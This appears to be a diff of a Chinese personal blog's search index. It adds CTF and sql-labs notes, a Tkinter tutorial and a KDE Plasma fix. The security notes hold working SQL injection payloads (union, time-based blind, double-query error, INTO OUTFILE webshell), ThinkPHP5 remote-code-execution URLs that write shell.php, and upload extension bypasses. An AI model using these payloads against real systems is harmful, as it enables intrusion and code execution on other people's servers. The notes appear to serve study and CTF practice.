@@ -161,7 +161,7 @@
 </li>
 <li>
 <p>字段值 ( 其中 separator 可选 ) ：</p>
-<p><code>?id=' union select 1,(select group_concat(&lt;查询到的列名&gt; separator ;) from &lt;当前表名&gt;), 3 %23</code></p>
+<p><code>?id=' union select 1,(select group_concat(&lt;查询到的列名&gt; separator ';') from &lt;当前表名&gt;), 3 %23</code></p>
 </li>
 </ul>
 <h4 id="获取哈希口令">获取哈希口令</h4>
@@ -178,6 +178,7 @@
 <h3 id="盲注">盲注</h3>
 <p>上述是用有回显注入举例说明 Sql 注入的基本过程的例子，盲注过程与此类似，只不过没有回显<br>
 需要逐位尝试。</p>
+<p>只要回显中有固定字符串，都可使用盲注脚本。</p>
 <h4 id="时间盲注">时间盲注</h4>
 <p><code>id=1 union select 1，if(SUBSTRING(user(),1,4)='root',sleep(5),1),3</code>（substring 函数的作用是将 user()从第一位字母到第四位字母截断。这段参数的注入逻辑是，user()的第一位到第四位如果为’root’，则页面等待 5 秒，否则结果为 1。）</p>
 <p>脚本：待补充</p>
@@ -190,6 +191,32 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;^(length(&#39;and&#39;)!&#x3D;0)--+</span><br></pre></td></tr></table></figure>
 <p>此样例可用来判断 and 是否被过滤。若满足异或条件则返回 id=0 对应的值，即被过滤。不满足异或条件则返回 id=1 对应的值，即未被过滤。也可以用<code>xor</code>来构造语句。</p>
 <p>不过，有的时候需要使用 <code>=</code> 而不是 <code>!=</code> 来判断。例如，WAF 过滤了 or，那么 order 的 length 就为 3，虽然不等于 0，但是没有 order 的功能了。</p>
+<h2 id="Sql-labs中的技巧总结">Sql-labs中的技巧总结</h2>
+<h3 id="Less-5-双查询注入（Double-injection）">Less-5 双查询注入（Double injection）</h3>
+<p>参考：<a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-27209-1-43.html</a></p>
+<ul>
+<li>COUNT() 函数返回匹配指定条件的行数。</li>
+<li>RAND() 函数，用于产生 0 至 1 之间的随机数</li>
+<li>ORDER BY 语句，针对某列数据进行排序，可接列名或数字，可接rand()函数表示随机排序。</li>
+<li>FLOOR() 函数，向下取整。</li>
+<li>GROUP BY 语句用于结合/分组。后接根据哪个字段进行分组。</li>
+<li>表示表中的列可用 ‘.’ 符号连接，形如：<a href="http://users.id" target="_blank" rel="noopener">users.id</a></li>
+</ul>
+<p>双重查询注入其实就是一个select语句中嵌套另一个select语句。如 <code>select count (select database())</code> ,结果为1。</p>
+<p>使用group by子句结合rand()函数以及像<code>count（*）</code>这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。使用floor()函数只是为了将查询结果分类。<br>
+使用如下SQL语句，发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>
+<h3 id="Less-7-写入文件（Outfile）">Less-7 写入文件（Outfile）</h3>
+<p>参考：<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">https://www.jianshu.com/p/1f97795443ce</a></p>
+<ul>
+<li>SELECT … INTO OUTFILE ‘&lt;路径&gt;’</li>
+<li>写入路径为服务器中的某一路径，而不是客户端路径</li>
+<li>会有权限限制，出现写不进去的情况（–secure-file-priv）</li>
+<li>可以往里写🐎，得shell连菜刀，狂喜（x</li>
+</ul>
+<h3 id="Less-8-布尔盲注（Blind-Boolean）">Less-8 布尔盲注（Blind-Boolean）</h3>
+<p>参考：</p>
+<h2 id="用Sqlmap过一遍Sql-labs">用Sqlmap过一遍Sql-labs</h2>
 <h2 id="防御相关">防御相关</h2>
 <p>目前还没什么概念，等以后再补充。</p>
 ]]></content>
@@ -258,6 +285,14 @@
 <h3 id="PHP基础">PHP基础</h3>
 <h4 id="的区别">-&gt; , =&gt; , :: 的区别</h4>
 <p><code>-&gt;</code> 是插入式解引用的符号，用法与C语言相似。<code>=&gt;</code> 在数组中常常出现，用来连接键值对。<code>::</code> 与C语言中的 <code>.</code> 类似，用于调用类的内部成员，或类之间的相互调用。</p>
+<h3 id="phps">.phps</h3>
+<p>服务器遇php文件会解析。此时若想要读源码要使用phps文件。源码泄露的来源。</p>
+<h3 id="thinkphp5-RCE">thinkphp5 RCE</h3>
+<p>5.1.x php版本&gt;5.5</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=assert&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=phpinfo()</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+<p>5.0.x php版本&gt;=5.4</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>
+<p>还可参见<a href="https://y4er.com/post/thinkphp5-rce/#5020" target="_blank" rel="noopener"><strong>Thinkphp</strong>5 RCE总结 – Y4er的博客</a>。</p>
 <h2 id="配置错误">配置错误</h2>
 <h3 id="源码泄露">源码泄露</h3>
 <h4 id="常见的网站源码备份文件后缀">常见的网站源码备份文件后缀</h4>
@@ -558,7 +593,232 @@
   <entry>
     <title>Tkinter学习笔记</title>
     <url>/blog/2020/06/16/Tkinter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h1>使用逻辑</h1>
+<ol>
+<li>
+<p>import tkinter。</p>
+</li>
+<li>
+<p>实例化窗口对象。例如</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">window</span> = tkinter.Tk()</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>对刚才实例化的窗口对象进行设置，如</p>
+<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">window</span>.<span class="meta">title</span>(<span class="string">'This is a titie.'</span>)</span><br><span class="line"><span class="meta">window</span>.geometry(<span class="string">'200x100'</span>)   # 中间的符号是英文字母<span class="string">'x'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>实例化各窗口内的控件并将其放置在窗口的某个位置，例如</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 实例化标签对象, 注意：方法的首字母大写</span></span><br><span class="line">label = tkinter.Label(window, <span class="attribute">text</span>=<span class="string">''</span>, <span class="attribute">textvariable</span>=..., font=(<span class="string">'Consolas'</span>, 20, <span class="string">'bold'</span>), <span class="attribute">width</span>=150, <span class="attribute">height</span>=100)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放置在窗口的某个位置</span></span><br><span class="line">label.pack()</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>令主窗口自我刷新，完成GUI的交互作用，如</p>
+<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.mainloop()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1>简单控件的使用方法小结</h1>
+<ul>
+<li>
+<p>Label控件</p>
+<p>Label控件是tkinter中的标签控件。用于显示文本和图像。语法格式如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">label = tkinter.<span class="constructor">Label( <span class="params">master</span>, <span class="params">options</span>, <span class="operator">...</span>)</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>master: 框架的父容器，可理解为某个窗口。</p>
+</li>
+<li>
+<p>options: 可设置的属性。这些选项可以用键值对的形式设置，并以逗号分隔。</p>
+<p>以下是可选项清单：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">序号</th>
+<th style="text-align:center">可选项 &amp; 描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">**anchor **    文本或图像在背景内容区的位置，默认为 center，可选值为（n,s,w,e,ne,nw,sw,se,center）eswn 是东南西北英文的首字母，表示：上北下南左西右东。</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center"><strong>bg</strong>  标签背景颜色</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center"><strong>bd</strong>  标签的大小，默认为 2 个像素</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center"><strong>bitmap</strong>  指定标签上的位图，如果指定了图片，则该选项忽略</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:center">**cursor ** 鼠标移动到标签时，光标的形状，可以设置为 arrow, circle, cross, plus 等。</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">**font ** 设置字体。</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">**fg ** 设置前景色。</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td style="text-align:center">**height ** 标签的高度，默认值是 0。</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td style="text-align:center">**image ** 设置标签图像。</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td style="text-align:center"><strong>justify</strong> 定义对齐方式，可选值有：LEFT,RIGHT,CENTER，默认为 CENTER。</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td style="text-align:center"><strong>padx</strong>  x轴间距，以像素计，默认 1。</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td style="text-align:center"><strong>pady</strong>  y轴间距，以像素计，默认 1。</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td style="text-align:center"><strong>relief</strong>  边框样式，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>14</strong></td>
+<td style="text-align:center">**text ** 设置文本，可以包含换行符(\n)。</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>15</strong></td>
+<td style="text-align:center"><strong>textvariable</strong>  标签显示 Tkinter 变量，StringVar。如果变量被修改，标签文本将自动更新。</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td style="text-align:center">**underline ** 设置下划线，默认 -1，如果设置 1，则是从第二个字符开始画下划线。</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td style="text-align:center">**width ** 设置标签宽度，默认值是 0，自动计算，单位以像素计。</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td style="text-align:center">**wraplength ** 设置标签文本为多少行显示，默认为 0。</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+</li>
+<li>
+<p>Button控件</p>
+<p>Button控件是tkinter中的按钮控件。用于在程序中显示按钮。按钮可与一个command函数进行关联，在按下按钮时执行command函数。语法格式如下：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">button = tkinter.Button ( master, <span class="attribute">option</span>=value, <span class="built_in">..</span>. )</span><br></pre></td></tr></table></figure>
+<p>以下是可选项清单：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">序号</th>
+<th style="text-align:center">可选项 &amp; 描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center"><strong>activebackground</strong>  当鼠标放上去时，按钮的背景色</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">**activeforeground ** 当鼠标放上去时，按钮的前景色</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:center">**bd ** 按钮边框的大小，默认为 2 个像素</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center">**bg ** 按钮的背景色</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>5</strong></td>
+<td style="text-align:center"><strong>command</strong>  按钮关联的函数，当按钮被点击时，执行该函数</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">**fg ** 按钮的前景色（按钮文本的颜色）</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">**font ** 文本字体</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td style="text-align:center">**height ** 按钮的高度</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td style="text-align:center">**highlightcolor ** 要高亮的颜色</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td style="text-align:center"><strong>image</strong>  按钮上要显示的图片</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td style="text-align:center">**justify ** 显示多行文本的时候,设置不同行之间的对齐方式，可选项包括LEFT, RIGHT, CENTER</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td style="text-align:center">**padx **  按钮在x轴方向上的内边距(padding)，是指按钮的内容与按钮边缘的距离</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td style="text-align:center">**pady ** 按钮在y轴方向上的内边距(padding)</td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td style="text-align:center">**relief ** 边框样式，设置控件3D效果，可选的有：FLAT、SUNKEN、RAISED、GROOVE、RIDGE。默认为 FLAT。</td>
+</tr>
+<tr>
+<td style="text-align:center">15</td>
+<td style="text-align:center">**state ** 设置按钮组件状态,可选的有NORMAL、ACTIVE、 DISABLED。默认 NORMAL。</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td style="text-align:center">**underline ** 下划线。默认按钮上的文本都不带下划线。取值就是带下划线的字符串索引，为 0 时，第一个字符带下划线，为 1 时，前两个字符带下划线，以此类推</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td style="text-align:center">**width ** 按钮的宽度，如未设置此项，其大小以适应按钮的内容（文本或图片的大小）</td>
+</tr>
+<tr>
+<td style="text-align:center">18</td>
+<td style="text-align:center">**wraplength ** 限制按钮每行显示的字符的数量</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td style="text-align:center">**text ** 按钮的文本内容</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td style="text-align:center"><strong>anchor</strong>  锚选项，控制文本的位置，默认为中心</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>开发</tag>
+        <tag>python</tag>
+        <tag>GUI</tag>
+      </tags>
   </entry>
   <entry>
     <title>PHP相关姿势</title>
@@ -1522,18 +1782,10 @@ md5 值为 <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8</code> 也可行。</p>
 </ul>
 <h3 id="后缀绕过">后缀绕过</h3>
 <ul>
-<li>
-<p>PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)</p>
-</li>
-<li>
-<p>ASP：asa、cer、cdx</p>
-</li>
-<li>
-<p>ASPX：ascx、ashx、asac</p>
-</li>
-<li>
-<p>JSP：jsp、jspx、jspf</p>
-</li>
+<li>PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)</li>
+<li>ASP：asa、cer、cdx</li>
+<li>ASPX：ascx、ashx、asac</li>
+<li>JSP：jsp、jspx、jspf</li>
 </ul>
 <h3 id="绕过类型">绕过类型</h3>
 <ul>
@@ -1598,6 +1850,39 @@ xx.jpg的内容可以为一段合法的asp脚本文件。</p>
       </categories>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决更改Plasma桌面后KDE系统设置无法打开的问题</title>
+    <url>/blog/2020/09/11/%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%94%B9Plasma%E6%A1%8C%E9%9D%A2%E5%90%8EKDE%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>更新 Manjaro Linux(KDE) 的 Plasma 主题包之后发现系统设置无法打开的解决方案。</p>
+<a id="more"></a>
+<h1>问题描述</h1>
+<p>在 Manjaro Linux 下配置 KDE Plasma 的时候更换了McMojave 主题。更换之后发现系统设置无法打开。猜测是由于主题的冲突导致的，于是猜测用切换成默认主题的方式可以解决此问题。但是一般更换默认主题的方式都是从系统设置入手，找到外观选项再切换主题，现在系统设置的 GUI 界面无法打开，于是尝试用其它方法更换成默认主题。</p>
+<h1>失败的尝试</h1>
+<h2 id="用中文搜索相关内容">用中文搜索相关内容</h2>
+<p>什么也没有。中文使用地区对操作系统问题的相关支持还是太薄弱了，即使有相关内容也一般都是及其过时的只言片语，相反转而去搜索英文内容的时候发现相关支持非常多，还是差距挺大的。也算获得了经验，以后遇到问题宁可去啃英文的文档也要减少对中文的依赖。</p>
+<h2 id="删除KDE设置项并重启">删除KDE设置项并重启</h2>
+<p>根据网络上的相关支持，将 <code>~/</code> 目录下的 <code>~/.kde/</code> 和 <code>~/.kde4/</code> 目录删除并重启，重启后发现 <code>~/.kde/</code> 目录自动生成了，其中的配置文件是根据当前主题的设置自动生成的。遂放弃。</p>
+<h2 id="重新安装-plasma-desktop-和-plasma-meta">重新安装 plasma-desktop 和 plasma-meta</h2>
+<p>重新安装之后发现没有任何变化。</p>
+<h1>成功的尝试</h1>
+<h2 id="用命令行检查系统设置GUI程序的问题">用命令行检查系统设置GUI程序的问题</h2>
+<p>Konsole 中键入 <code>systemsettings5</code> 以尝试从命令行启动系统设置。发现输出错误：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cyclic dependency detected between <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:141:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:131:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; cyclic dependency detected between <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> qqmlengine::setcontextforobject(): object already has a qqmlcontext qt.qpa.xcb: qxcbconnection: xcb error: 5 (badatom), sequence: 629, resource id: 0, major code: 20 (getproperty), minor code: 0</span><br></pre></td></tr></table></figure>
+<p>似乎确定了问题是由于新采用的主题产生了循环依赖之类的问题。接下来考虑如何将主题更换回默认。</p>
+<h2 id="从命令行将主题更换回-Breeze（默认主题）">从命令行将主题更换回 Breeze（默认主题）</h2>
+<p>使用 Konsole，键入 <code>systemsettings5 --style=Breeze</code>，绕过GUI界面从命令行直接更改主题。重启。系统设置可以打开，问题得到解决。</p>
+<p>详请参见：<a href="https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/" target="_blank" rel="noopener">https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/</a></p>
+<h1>感想</h1>
+<p>中文社区的力量还是比较渺小，学英语真的很重要，英文社区啥都有（</p>
+]]></content>
+      <categories>
+        <category>系统</category>
+      </categories>
+      <tags>
+        <tag>KDE</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
 </search>
